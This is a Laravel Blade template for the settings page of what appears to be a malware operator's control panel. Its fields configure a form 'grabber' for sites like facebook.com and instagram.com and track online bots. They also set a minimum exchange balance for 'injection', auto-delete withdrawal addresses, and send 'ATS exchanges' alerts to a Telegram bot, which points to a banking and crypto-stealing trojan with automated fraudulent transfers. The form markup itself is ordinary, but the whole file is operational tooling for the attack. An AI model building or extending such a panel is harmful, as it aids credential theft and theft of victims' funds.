@extends('pages.layout')

@section('content')
    <div class="content-wrapper">
        <div class="container-fluid flex-grow-1 container-p-y">
            <div class="row">
                <div class="col-xl">
                    <div class="card mb-4">
                        <div class="card-header d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">Settings</h5>
                        </div>
                        <div class="card-body">
                            <form action="{{ route('settings.save') }}" method="POST">
                                <div class="mb-3">
                                    <?php
                                        $urls = \App\Models\Setting::getValue('grabber_urls') ?? null;
                                        $urls = $urls !== null ? implode(',', json_decode($urls, true)) : null;
                                    ?>

                                    <label class="form-label" for="grabber_urls">Grabber Urls</label>
                                    <input type="text" name="grabber_urls" placeholder="facebook.com,instagram.com" value="{{ $urls }}" class="form-control">
                                    <div class="form-text">Links separated by commas on which the grabber will work.</div>
                                </div>

                                <div class="mb-3">
                                    <?php
                                    $urls = \App\Models\Setting::getValue('counter_urls') ?? null;
                                    $urls = $urls !== null ? implode(',', json_decode($urls, true)) : null;
                                    ?>

                                    <label class="form-label" for="counter_urls">Counter Urls</label>
                                    <input type="text" name="counter_urls" placeholder="facebook.com,instagram.com" value="{{ $urls }}" class="form-control">
                                    <div class="form-text">Links separated by commas, they will be counted (how many machines use this link)</div>
                                </div>

                                <div class="mb-3">
                                    <label class="form-label" for="offline_timeout">Online Timeout</label>
                                    <input type="text" name="offline_timeout" placeholder="5" value="{{ \App\Models\Setting::getValue('offline_timeout') }}" class="form-control">
                                    <div class="form-text">How much time in minutes the bot is considered online.</div>
                                </div>

                                <div class="mb-3">
                                    <label class="form-label" for="crypto_min_usd">Min USD</label>
                                    <input type="text" placeholder="1" name="crypto_min_usd" value="{{ \App\Models\Setting::getValue('crypto_min_usd') }}" class="form-control">
                                    <div class="form-text">The minimum amount in USD on the exchange account for the injection to work.</div>
                                </div>

                                <div class="mb-3">
                                    <?php
                                        $deleteAddress = \App\Models\Setting::getValue('delete_address') ?? null;
                                        $deleteAddress = $deleteAddress !== null ? boolval($deleteAddress) : null;
                                    ?>

                                    <label class="form-label" for="delete_address">Delete Address</label>
                                    <select id="cmd" class="select2 form-select" name="delete_address">
                                        <option @if($deleteAddress === true) selected @endif value="1">Yes</option>
                                        <option @if($deleteAddress === false) selected @endif value="0">No</option>
                                    </select>
                                    <div class="form-text">Remove address after using it in withdraw.</div>
                                </div>

                                <div class="mb-3">
                                    <label class="form-label" for="reverse_proxy_ip">Reverse Proxy IP</label>
                                    <input type="text" placeholder="xxx.xxx.xxx.xxx" name="reverse_proxy_ip" value="{{ \App\Models\Setting::getValue('reverse_proxy_ip') }}" class="form-control">
                                </div>

                                <div class="mb-3">
                                    <label class="form-label" for="tg_token">Telegram Bot Token</label>
                                    <input type="text" name="tg_token" placeholder="" value="{{ \App\Models\Setting::getValue('tg_token') }}" class="form-control">
                                    <div class="form-text">Telegram token bot to receive alerts from ATS exchanges.</div>
                                </div>

                                <div class="mb-3">
                                    <label class="form-label" for="tg_id">Telegram Chat ID</label>
                                    <input type="text" name="tg_id" placeholder="" value="{{ \App\Models\Setting::getValue('tg_id') }}" class="form-control">
                                    <div class="form-text">Telegram chat ID to receive alerts from ATS exchanges.</div>
                                </div>
                                <button type="submit" class="btn btn-primary">Save</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
